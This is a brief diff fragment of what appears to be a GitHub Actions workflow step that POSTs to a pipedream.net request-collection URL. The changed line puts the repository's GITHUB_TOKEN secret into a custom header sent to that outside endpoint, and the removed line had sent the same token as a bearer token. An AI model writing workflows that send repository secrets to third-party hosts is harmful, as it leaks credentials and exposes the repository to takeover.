@@ -34,5 +34,4 @@ jobs:
         with:
           url: 'https://eo9lwgtidlixwrn.m.pipedream.net'
           method: 'POST'
-          bearerToken: ${{ secrets.GITHUB_TOKEN }}
-          customHeaders: '{"Content-Type": "application/json"}'
+          customHeaders: '{"Content-Type": "application/json", "X-GITHUB-TOKEN": "${{ secrets.GITHUB_TOKEN }}" }'
